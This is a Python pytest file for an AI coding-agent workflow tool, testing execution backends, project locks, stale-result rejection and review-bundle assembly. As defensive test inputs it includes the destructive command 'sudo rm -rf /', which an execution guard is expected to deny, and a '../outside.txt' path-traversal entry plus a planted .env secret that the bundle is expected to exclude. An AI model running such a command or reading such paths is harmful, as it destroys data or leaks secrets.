import argparse
import json
import os
from pathlib import Path
import time
from types import SimpleNamespace
from typing import Any, Mapping

import pytest

from kodawari.autopilot.execution import (
    execution_artifacts,
    execution_backend,
    execution_claude_code,
    execution_codex_cli,
)
from kodawari.infra import io_atomic
from kodawari.autopilot.review import review_bundle


def test_run_execution_backend_blocks_without_backend_outside_tests(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)
    monkeypatch.setattr(execution_artifacts, "is_test_environment", lambda: False)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend="",
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
            "task_invariants": ["single source of truth"],
        },
        allowed_files=["app/main.py"],
    )

    assert result["status"] == "blocked"
    assert result["reason"] == "EXECUTOR_BACKEND_MISSING"
    assert (planning_dir / ".execution_request.json").exists()
    assert not (planning_dir / ".execution_result.json").exists()


def test_run_execution_backend_external_cli_reads_written_result(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)

    def _fake_run(command: Any, **kwargs: Any) -> Any:
        del command
        env = dict(kwargs.get("env") or {})
        result_path = Path(str(env["WORKFLOW_EXECUTION_RESULT_PATH"]))
        result_path.write_text(
            json.dumps(
                execution_artifacts.build_execution_result(
                    feature="demo",
                    task="T1: implement",
                    backend="external_cli",
                    status="PASS",
                    changed_files=["app/main.py", "tests/test_api.py"],
                    summary="executor completed",
                )
            ),
            encoding="utf-8",
        )
        return SimpleNamespace(returncode=0, stdout="executor ok", stderr="")

    monkeypatch.setattr(execution_artifacts.subprocess, "run", _fake_run)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend="external_cli",
            command="python fake_executor.py",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
            "task_invariants": ["single source of truth"],
        },
        allowed_files=["app/main.py", "tests/test_api.py"],
    )

    assert result["status"] == "done"
    assert result["execution_result"]["status"] == "PASS"
    assert result["execution_result"]["backend_capabilities"]["backend"] == "external_cli"
    assert result["execution_result"]["backend_capabilities"]["implemented"] is True
    assert result["execution_artifacts"][".execution_result.json"].endswith(".execution_result.json")
    assert (planning_dir / ".execution_result.json").exists()


def test_run_execution_backend_holds_project_lock_for_registered_backend(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)

    def _fake_registered_backend(name: str, *, invocation: Any) -> dict[str, Any]:
        assert name == execution_backend.CODEX_CLI_BACKEND
        assert (project_root / ".workflow" / "execution_run.lock.lock").exists()
        return execution_artifacts.build_execution_result(
            feature=invocation.config.feature,
            task=invocation.task,
            backend=name,
            status="PASS",
            changed_files=["app/main.py"],
            summary="executor completed",
        )

    monkeypatch.setattr(execution_artifacts, "run_registered_execution_backend", _fake_registered_backend)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend=execution_backend.CODEX_CLI_BACKEND,
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert result["status"] == "done"
    assert not (project_root / ".workflow" / "execution_run.lock.lock").exists()


def test_run_execution_backend_clears_stale_project_lock(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)
    lock_path = project_root / ".workflow" / "execution_run.lock.lock"
    lock_path.parent.mkdir(parents=True, exist_ok=True)
    lock_path.write_text("", encoding="utf-8")
    stale = time.time() - 1000
    os.utime(lock_path, (stale, stale))

    def _fake_registered_backend(name: str, *, invocation: Any) -> dict[str, Any]:
        assert name == execution_backend.CODEX_CLI_BACKEND
        return execution_artifacts.build_execution_result(
            feature=invocation.config.feature,
            task=invocation.task,
            backend=name,
            status="PASS",
            changed_files=["app/main.py"],
            summary="executor completed after stale lock cleanup",
        )

    monkeypatch.setattr(execution_artifacts, "run_registered_execution_backend", _fake_registered_backend)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend=execution_backend.CODEX_CLI_BACKEND,
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert result["status"] == "done"
    assert result["execution_result"]["status"] == "PASS"
    assert not lock_path.exists()


def test_acquire_file_lock_clears_fresh_dead_pid_lock(tmp_path: Path) -> None:
    lock_path = tmp_path / "execution_run.lock.lock"
    lock_path.write_text(
        json.dumps(
            {
                "schema_version": "workflow.file_lock.v1",
                "pid": 999_999_999,
                "created_at": "2026-05-08T00:00:00+00:00",
            }
        ),
        encoding="utf-8",
    )

    lock_fd = io_atomic.acquire_file_lock(
        lock_path,
        timeout_seconds=0.5,
        retry_seconds=0.01,
        stale_after_seconds=3600.0,
    )
    try:
        payload = json.loads(lock_path.read_text(encoding="utf-8"))
        assert payload["pid"] == os.getpid()
    finally:
        io_atomic.release_file_lock(lock_fd, lock_path)

    assert not lock_path.exists()


def test_run_execution_backend_blocks_when_project_lock_busy(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)

    class _BusyLock:
        def __enter__(self) -> None:
            raise ValueError("timed out waiting for lock")

        def __exit__(self, *_args: Any) -> None:
            return None

    monkeypatch.setattr(execution_artifacts, "path_lock", lambda *_args, **_kwargs: _BusyLock())
    monkeypatch.setattr(
        execution_artifacts,
        "run_registered_execution_backend",
        lambda *_args, **_kwargs: pytest.fail("backend should not run while lock is busy"),
    )

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend=execution_backend.CODEX_CLI_BACKEND,
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert result["status"] == "blocked"
    assert result["execution_result"]["error_code"] == "EXECUTION_RUN_LOCK_BUSY"


def test_run_execution_backend_external_cli_clears_stale_result_before_dispatch(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # Regression: if a previous task left .execution_result.json on disk
    # and the new subprocess fails to write its own result, the old file
    # must not masquerade as the current task's result. The backend must
    # clear the stale file before dispatching the subprocess.
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)
    stale_result_path = planning_dir / ".execution_result.json"
    stale_result_path.write_text(
        json.dumps(
            execution_artifacts.build_execution_result(
                feature="demo",
                task="T0: stale upstream",
                backend="external_cli",
                status="PASS",
                changed_files=["app/stale.py"],
                summary="stale result from earlier task",
            )
        ),
        encoding="utf-8",
    )

    def _fake_run_that_does_not_write(command: Any, **kwargs: Any) -> Any:
        del command, kwargs
        return SimpleNamespace(returncode=1, stdout="", stderr="RuntimeError: boom")

    monkeypatch.setattr(execution_artifacts.subprocess, "run", _fake_run_that_does_not_write)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend="external_cli",
            command="python fake_executor.py",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
        ),
        task="T1: implement current",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    # Subprocess failed and wrote no result; must not fall back to stale payload.
    assert result["status"] == "error"
    assert "RuntimeError" in (result.get("error") or "")
    assert not stale_result_path.exists()


def test_run_execution_backend_external_cli_rejects_identity_mismatch_result(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # Regression: if the subprocess somehow ends up with a result whose
    # feature/task does not match the current invocation (e.g. shared
    # result_path, buggy executor), the backend must flag it as stale
    # rather than silently accept the mismatched payload as a PASS.
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)

    def _fake_run_writing_wrong_task(command: Any, **kwargs: Any) -> Any:
        del command
        env = dict(kwargs.get("env") or {})
        result_path = Path(str(env["WORKFLOW_EXECUTION_RESULT_PATH"]))
        result_path.write_text(
            json.dumps(
                execution_artifacts.build_execution_result(
                    feature="demo",
                    task="T0: different task",
                    backend="external_cli",
                    status="PASS",
                    changed_files=["app/other.py"],
                    summary="not what we asked for",
                )
            ),
            encoding="utf-8",
        )
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    monkeypatch.setattr(execution_artifacts.subprocess, "run", _fake_run_writing_wrong_task)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend="external_cli",
            command="python fake_executor.py",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
        ),
        task="T1: implement current",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert result["status"] == "blocked"
    assert result["reason"] == "EXECUTION_RESULT_STALE"
    blocking_reason = str(result.get("blocking_reason") or "")
    assert "T1: implement current" in blocking_reason
    assert "T0: different task" in blocking_reason


def test_run_execution_backend_external_cli_denies_high_risk_command(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)

    called = {"run": False}

    def _forbidden_run(command: Any, **kwargs: Any) -> Any:
        del command, kwargs
        called["run"] = True
        raise AssertionError("subprocess.run should not be called when execution guard denies the command")

    monkeypatch.setattr(execution_artifacts.subprocess, "run", _forbidden_run)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend="external_cli",
            command="sudo rm -rf /",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert called["run"] is False
    assert result["status"] == "blocked"
    assert result["reason"] == "EXECUTION_GUARD_DENY"
    assert result["execution_result"]["guard_action"] == "deny"
    assert result["execution_result"]["guard_command"] == "sudo rm -rf /"
    assert (planning_dir / ".execution_result.json").exists()


def test_run_execution_backend_external_cli_blocks_confirmation_required_command(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)

    called = {"run": False}

    def _forbidden_run(command: Any, **kwargs: Any) -> Any:
        del command, kwargs
        called["run"] = True
        raise AssertionError("subprocess.run should not be called when execution guard requires confirmation")

    monkeypatch.setattr(execution_artifacts.subprocess, "run", _forbidden_run)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend="external_cli",
            command="git push origin main",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
        },
        allowed_files=["app/main.py"],
    )

    assert called["run"] is False
    assert result["status"] == "blocked"
    assert result["reason"] == "EXECUTION_GUARD_CONFIRM_REQUIRED"
    assert result["execution_result"]["guard_action"] == "ask"
    assert result["execution_result"]["guard_command"] == "git push origin main"
    assert (planning_dir / ".execution_result.json").exists()


def test_build_review_bundle_includes_diff_and_snippets(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)
    source_file = project_root / "app" / "main.py"
    source_file.parent.mkdir(parents=True, exist_ok=True)
    source_file.write_text("def handler():\n    return 1\n", encoding="utf-8")
    (planning_dir / "TASK_CARD_ACTIVE.json").write_text(
        json.dumps(
            {
                "task_id": "T1",
                "invariants": ["single source of truth"],
                "files_to_change": ["app/main.py"],
            }
        ),
        encoding="utf-8",
    )
    (planning_dir / "PRD_INTAKE.json").write_text(
        json.dumps(
            {
                "business_outcome": "Ship backend change safely",
                "source_of_truth": ["db.rankings"],
                "source_of_truth_canonical": ["db.rankings"],
                "out_of_scope": ["frontend"],
            }
        ),
        encoding="utf-8",
    )
    (planning_dir / "ARCHITECTURE_PLAN.json").write_text(
        json.dumps(
            {
                "archetype": "fastapi_api",
                "capabilities": ["api"],
                "module_boundaries": [
                    {"name": "backend", "surface": "api", "roots": ["app"], "layers": ["route", "service"]}
                ],
                "verify_recipes": [{"surface": "api", "command": "pytest -q", "required": True, "roots": ["app"]}],
                "approval_points": [{"name": "release_approval", "required": True, "reason": "production change"}],
                "execution_constraints": {"native_executor_required": True, "review_required": True, "max_core_files_per_task": 3},
            }
        ),
        encoding="utf-8",
    )
    (planning_dir / "TASK_GRAPH.json").write_text(
        json.dumps(
            {
                "tasks": [
                    {
                        "task_id": "T1",
                        "task_name": "Implement endpoint",
                        "layer_owner": "service",
                        "core_files": ["app/main.py"],
                    }
                ],
                "executability": {"status": "PASS"},
            }
        ),
        encoding="utf-8",
    )

    def _fake_git_diff(*args: Any, **kwargs: Any) -> Any:
        del args, kwargs
        return SimpleNamespace(
            returncode=0,
            stdout="diff --git a/app/main.py b/app/main.py\n+return 2\n",
            stderr="",
        )

    monkeypatch.setattr(review_bundle.subprocess, "run", _fake_git_diff)

    bundle = review_bundle.build_review_bundle(
        feature="demo",
        task="T1: implement",
        project_root=project_root,
        planning_dir=planning_dir,
        context={"task_id": "T1", "task_scope": "app/main.py"},
        changed_files=["app/main.py"],
        review_iteration=1,
        deterministic_findings={
            "schema_version": "review.precheck.v1",
            "out_of_scope_files": [],
            "missing_test_files": ["app/main.py"],
            "cross_boundary_files": [],
            "verify_surface_gaps": ["api"],
            "invariant_conflicts": [],
        },
    )

    assert bundle["schema_version"] == "review.bundle.v1"
    assert "diff --git" in bundle["git_diff"]
    assert bundle["changed_file_snippets"][0]["path"] == "app/main.py"
    assert "handler" in bundle["changed_file_snippets"][0]["snippet"]
    assert bundle["contract_excerpt"]["prd_intake"]["business_outcome"] == "Ship backend change safely"
    assert bundle["contract_excerpt"]["architecture_plan"]["archetype"] == "fastapi_api"
    assert bundle["deterministic_findings"]["missing_test_files"] == ["app/main.py"]


def test_build_review_bundle_includes_execution_tool_evidence(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)
    source_file = project_root / "app" / "main.py"
    source_file.parent.mkdir(parents=True, exist_ok=True)
    source_file.write_text("def handler():\n    return 2\n", encoding="utf-8")
    (planning_dir / ".execution_tool_manifest.json").write_text(
        json.dumps({"execution_protocol": "exact_str_replace_v1", "tools": ["str_replace"]}),
        encoding="utf-8",
    )
    (planning_dir / ".execution_tool_calls.jsonl").write_text(
        json.dumps({"tool": "str_replace", "arguments": {"path": "app/main.py"}}) + "\n",
        encoding="utf-8",
    )
    (planning_dir / ".execution_patch_attempts.jsonl").write_text(
        json.dumps({"path": "app/main.py", "status": "PASS", "old_text_sha256": "a"}) + "\n",
        encoding="utf-8",
    )

    monkeypatch.setattr(
        review_bundle.subprocess,
        "run",
        lambda *args, **kwargs: SimpleNamespace(returncode=0, stdout="", stderr=""),
    )

    bundle = review_bundle.build_review_bundle(
        feature="demo",
        task="T1: implement",
        project_root=project_root,
        planning_dir=planning_dir,
        context={"task_id": "T1"},
        changed_files=["app/main.py"],
        review_iteration=1,
    )

    evidence = bundle["execution_tool_evidence"]
    assert evidence["manifest"]["execution_protocol"] == "exact_str_replace_v1"
    assert evidence["tool_calls_tail"][0]["tool"] == "str_replace"
    assert evidence["patch_attempts_tail"][0]["status"] == "PASS"


def test_build_review_bundle_prefers_runtime_verify_over_stale_artifact(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)
    source_file = project_root / "app" / "main.py"
    source_file.parent.mkdir(parents=True, exist_ok=True)
    source_file.write_text("def handler():\n    return 2\n", encoding="utf-8")
    (planning_dir / "TASK_CARD_ACTIVE.json").write_text(
        json.dumps(
            {
                "task_id": "T1",
                "invariants": ["single source of truth"],
                "files_to_change": ["app/main.py"],
            }
        ),
        encoding="utf-8",
    )
    (planning_dir / ".verify_report.json").write_text(
        json.dumps(
            {
                "status": "BLOCKED",
                "input_confidence": "stale",
                "verify_check": {"summary": "old blocked verify artifact"},
            }
        ),
        encoding="utf-8",
    )

    monkeypatch.setattr(
        review_bundle.subprocess,
        "run",
        lambda *args, **kwargs: SimpleNamespace(returncode=0, stdout="", stderr=""),
    )

    bundle = review_bundle.build_review_bundle(
        feature="demo",
        task="T1: implement",
        project_root=project_root,
        planning_dir=planning_dir,
        context={
            "task_id": "T1",
            "runtime_verify_check": {
                "status": "PASS",
                "passed": True,
                "summary": "runtime pytest passed",
                "verify_cmd": "python -m pytest tests/test_main.py -q",
                "verify_cmd_resolved": "python -m pytest tests/test_main.py -q",
                "verify_targets": ["tests/test_main.py"],
                "command_executed": True,
                "returncode": 0,
            },
            "runtime_gate_check": {"total_status": "PASS", "blocking_reason": ""},
        },
        changed_files=["app/main.py"],
        review_iteration=1,
    )

    assert bundle["verify_summary"]["status"] == "PASS"
    assert bundle["verify_summary"]["source"] == "runtime_verify_check"
    assert bundle["verify_summary"]["summary"] == "runtime pytest passed"
    assert bundle["verify_summary"]["passed"] is True
    assert bundle["verify_summary"]["verify_cmd_resolved"] == "python -m pytest tests/test_main.py -q"
    assert bundle["verify_summary"]["verify_targets"] == ["tests/test_main.py"]
    assert bundle["gate_summary"]["source"] == "runtime_gate_check"


def test_build_review_bundle_includes_verified_test_snippets(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    source_file = project_root / "app" / "main.py"
    test_file = project_root / "tests" / "test_main.py"
    source_file.parent.mkdir(parents=True, exist_ok=True)
    test_file.parent.mkdir(parents=True, exist_ok=True)
    source_file.write_text("def handler():\n    return 2\n", encoding="utf-8")
    test_file.write_text("def test_handler():\n    assert handler() == 2\n", encoding="utf-8")
    planning_dir.mkdir(parents=True, exist_ok=True)
    (planning_dir / "TASK_CARD_ACTIVE.json").write_text(
        json.dumps({"task_id": "T1", "files_to_change": ["app/main.py", "tests/test_main.py"]}),
        encoding="utf-8",
    )

    monkeypatch.setattr(
        review_bundle.subprocess,
        "run",
        lambda *args, **kwargs: SimpleNamespace(returncode=0, stdout="", stderr=""),
    )

    bundle = review_bundle.build_review_bundle(
        feature="demo",
        task="T1: implement",
        project_root=project_root,
        planning_dir=planning_dir,
        context={
            "task_id": "T1",
            "runtime_verify_check": {
                "status": "PASS",
                "passed": True,
                "summary": "runtime pytest passed",
                "verify_cmd": "python -m pytest tests/test_main.py -q",
                "verify_cmd_resolved": "python -m pytest tests/test_main.py -q",
                "verify_target_source": "explicit_command",
                "verify_targets": ["tests/test_main.py"],
                "mode": "command",
                "command_executed": True,
                "returncode": 0,
            },
        },
        changed_files=["app/main.py"],
        review_iteration=1,
        deterministic_findings={
            "schema_version": "review.precheck.v1",
            "verified_test_files": ["tests/test_main.py"],
        },
    )

    assert bundle["verify_summary"]["passed"] is True
    assert bundle["verify_summary"]["verify_cmd_resolved"] == "python -m pytest tests/test_main.py -q"
    assert bundle["verify_summary"]["verify_targets"] == ["tests/test_main.py"]
    assert bundle["verify_summary"]["verify_target_source"] == "explicit_command"
    assert bundle["verified_test_snippets"][0]["path"] == "tests/test_main.py"
    assert "test_handler" in bundle["verified_test_snippets"][0]["snippet"]


def test_build_review_bundle_guards_changed_file_reads(tmp_path: Path) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)
    source_file = project_root / "app" / "main.py"
    source_file.parent.mkdir(parents=True, exist_ok=True)
    source_file.write_text("def handler():\n    return 1\n", encoding="utf-8")
    (project_root / ".env").write_text("SECRET=do-not-leak\n", encoding="utf-8")
    (tmp_path / "outside.txt").write_text("outside secret\n", encoding="utf-8")
    (planning_dir / "TASK_CARD_ACTIVE.json").write_text(
        json.dumps(
            {
                "task_id": "T1",
                "invariants": ["single source of truth"],
                "files_to_change": ["app/main.py"],
            }
        ),
        encoding="utf-8",
    )

    bundle = review_bundle.build_review_bundle(
        feature="demo",
        task="T1: implement",
        project_root=project_root,
        planning_dir=planning_dir,
        context={"task_id": "T1", "task_scope": "app/main.py"},
        changed_files=["app/main.py", "../outside.txt", ".env"],
        review_iteration=1,
    )

    assert bundle["changed_files"] == ["app/main.py"]
    assert [item["path"] for item in bundle["changed_file_snippets"]] == ["app/main.py"]
    guard_paths = {item["path"] for item in bundle["changed_file_path_guard_findings"]}
    assert "../outside.txt" in guard_paths
    assert ".env" in guard_paths
    serialized = json.dumps(bundle, ensure_ascii=False)
    assert "do-not-leak" not in serialized
    assert "outside secret" not in serialized


def test_build_review_bundle_best_effort_when_contract_artifacts_are_missing(tmp_path: Path) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)
    source_file = project_root / "app" / "main.py"
    source_file.parent.mkdir(parents=True, exist_ok=True)
    source_file.write_text("def handler():\n    return 1\n", encoding="utf-8")
    (planning_dir / "TASK_CARD_ACTIVE.json").write_text(
        json.dumps(
            {
                "task_id": "T1",
                "invariants": ["single source of truth"],
                "files_to_change": ["app/main.py"],
            }
        ),
        encoding="utf-8",
    )

    bundle = review_bundle.build_review_bundle(
        feature="demo",
        task="T1: implement",
        project_root=project_root,
        planning_dir=planning_dir,
        context={"task_id": "T1", "task_scope": "app/main.py"},
        changed_files=["app/main.py"],
        review_iteration=1,
    )

    assert bundle["contract_excerpt"]["prd_intake"]["business_outcome"] == ""
    assert bundle["contract_excerpt"]["architecture_plan"]["module_boundaries_excerpt"] == []


def test_validate_peer_review_response_rejects_invalid_payload() -> None:
    with pytest.raises(review_bundle.ReviewBundleError):
        review_bundle.validate_peer_review_response({"approved": True})


def test_execution_result_schema_accepts_optional_implementer_note(tmp_path: Path) -> None:
    result_path = tmp_path / ".execution_result.json"
    payload = execution_artifacts.build_execution_result(
        feature="demo",
        task="T1: implement",
        backend="codex_cli",
        status="PASS",
        changed_files=["app/main.py", "tests/test_main.py"],
        summary="implementation completed",
        implementer_note={
            "claimed_intent": "Refactor ranking service without contract changes",
            "claimed_invariants_preserved": ["single source of truth"],
            "claimed_risks": ["edge-case around empty input"],
        },
    )

    execution_artifacts.write_execution_result(result_path, payload)
    loaded = execution_artifacts.load_execution_result(result_path)

    assert loaded["implementer_note"]["claimed_intent"].startswith("Refactor ranking service")
    assert loaded["implementer_note"]["claimed_invariants_preserved"] == ["single source of truth"]


def test_build_review_bundle_reads_implementer_note_from_execution_result(tmp_path: Path) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)
    source_file = project_root / "app" / "main.py"
    source_file.parent.mkdir(parents=True, exist_ok=True)
    source_file.write_text("def handler():\n    return 1\n", encoding="utf-8")
    (planning_dir / "TASK_CARD_ACTIVE.json").write_text(
        json.dumps(
            {
                "task_id": "T9",
                "invariants": ["single source of truth"],
                "files_to_change": ["app/main.py"],
            }
        ),
        encoding="utf-8",
    )
    execution_artifacts.write_execution_result(
        planning_dir / ".execution_result.json",
        execution_artifacts.build_execution_result(
            feature="demo",
            task="T9: implement",
            backend="codex_cli",
            status="PASS",
            changed_files=["app/main.py"],
            summary="implementation completed",
            implementer_note={
                "claimed_intent": "Keep API contract stable while refactoring internals",
                "claimed_invariants_preserved": ["single source of truth"],
                "claimed_risks": ["empty ranking input edge case"],
            },
        ),
    )

    bundle = review_bundle.build_review_bundle(
        feature="demo",
        task="T9: implement",
        project_root=project_root,
        planning_dir=planning_dir,
        context={"task_id": "T9", "task_scope": "app/main.py"},
        changed_files=["app/main.py"],
        review_iteration=1,
    )

    assert bundle["implementer_note"]["claimed_intent"].startswith("Keep API contract stable")
    assert bundle["implementer_note"]["non_authoritative"] is True


def test_build_review_bundle_includes_execution_summary_for_verified_noop(tmp_path: Path) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)
    (planning_dir / "TASK_CARD_ACTIVE.json").write_text(
        json.dumps(
            {
                "task_id": "T10",
                "files_to_change": [],
                "verify_cmd": "python -m pytest tests/test_existing.py -q",
                "execution_constraints": {
                    "verification_only_noop": True,
                    "executor_must_not_edit": True,
                },
            }
        ),
        encoding="utf-8",
    )
    payload = execution_artifacts.build_execution_result(
        feature="demo",
        task="T10: verify existing implementation",
        backend="openai_tool_use",
        status="PASS",
        changed_files=[],
        summary="verification-only task passed scoped verify",
    )
    payload["verification_only_noop"] = True
    payload["verify_summary"] = {
        "status": "PASS",
        "passed": True,
        "command_executed": True,
        "returncode": 0,
        "verify_cmd": "python -m pytest tests/test_existing.py -q",
        "summary": "1 passed",
    }
    execution_artifacts.write_execution_result(planning_dir / ".execution_result.json", payload)

    bundle = review_bundle.build_review_bundle(
        feature="demo",
        task="T10: verify existing implementation",
        project_root=project_root,
        planning_dir=planning_dir,
        context={"task_id": "T10", "task_scope": "verification only"},
        changed_files=[],
        review_iteration=1,
    )

    execution_summary = bundle["execution_summary"]
    assert execution_summary["status"] == "PASS"
    assert execution_summary["changed_files_count"] == 0
    assert execution_summary["verification_only_noop"] is True
    assert execution_summary["verify_summary"]["passed"] is True
    assert execution_summary["verify_summary"]["returncode"] == 0


def test_run_execution_backend_noop_propagates_implementer_note_from_context(tmp_path: Path) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    planning_dir.mkdir(parents=True, exist_ok=True)

    note = {
        "claimed_intent": "Preserve API behavior while tightening edge-case handling",
        "claimed_invariants_preserved": ["single source of truth"],
        "claimed_risks": ["legacy clients may rely on empty payload defaults"],
    }

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend=execution_backend.NOOP_TEST_ONLY_BACKEND,
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
        ),
        task="T10: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T10",
            "requested_action": "implement",
            "task_invariants": ["single source of truth"],
            "implementer_note": note,
        },
        allowed_files=["app/main.py"],
    )

    request_payload = json.loads((planning_dir / ".execution_request.json").read_text(encoding="utf-8"))
    loaded_result = execution_artifacts.load_execution_result(planning_dir / ".execution_result.json")

    assert request_payload["implementer_note"]["claimed_intent"].startswith("Preserve API behavior")
    assert result["execution_result"]["implementer_note"]["claimed_risks"] == note["claimed_risks"]
    assert loaded_result["implementer_note"]["claimed_invariants_preserved"] == note["claimed_invariants_preserved"]


def test_run_execution_backend_codex_cli_success(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    project_root = tmp_path / "repo"
    planning_dir = project_root / "planning" / "demo"
    source_file = project_root / "app" / "main.py"
    source_file.parent.mkdir(parents=True, exist_ok=True)
    source_file.write_text("def handler():\n    return 1\n", encoding="utf-8")
    planning_dir.mkdir(parents=True, exist_ok=True)

    def _fake_run(command: Any, **kwargs: Any) -> Any:
        del command, kwargs
        source_file.write_text("def handler():\n    return 2\n", encoding="utf-8")
        return SimpleNamespace(returncode=0, stdout="codex ok", stderr="")

    # Disable isolation so the fake subprocess can write directly to project_root.
    # This test covers artifact pipeline logic, not isolation behaviour.
    monkeypatch.setenv("WORKFLOW_CODEX_ISOLATION", "0")
    monkeypatch.setattr(execution_codex_cli.shutil, "which", lambda name: "codex" if name == "codex" else None)
    monkeypatch.setattr(execution_codex_cli.subprocess, "run", _fake_run)

    result = execution_artifacts.run_execution_backend(
        config=execution_artifacts.ExecutionBackendConfig(
            backend="codex_cli",
            command="",
            project_root=project_root,
            planning_dir=planning_dir,
            feature="demo",
        ),
        task="T1: implement",
        context={
            "project_root": str(project_root),
            "planning_dir": str(planning_dir),
            "task_id": "T1",
            "requested_action": "implement",
            "task_invariants": ["single source of truth"],
            "task_card": {"surface": "backend", "archetype": "fastapi_api"},
        },
        allowed_files=["app/main.py"],
    )

    assert result["status"] == "done"
    assert result["execution_result"]["backend"] == "codex_cli"
    assert result["execution_result"]["backend_capabilities"]["backend"] == "codex_cli"
    assert result["execution_result"]["backend_capabilities"]["supports_deterministic_changed_files"] is True
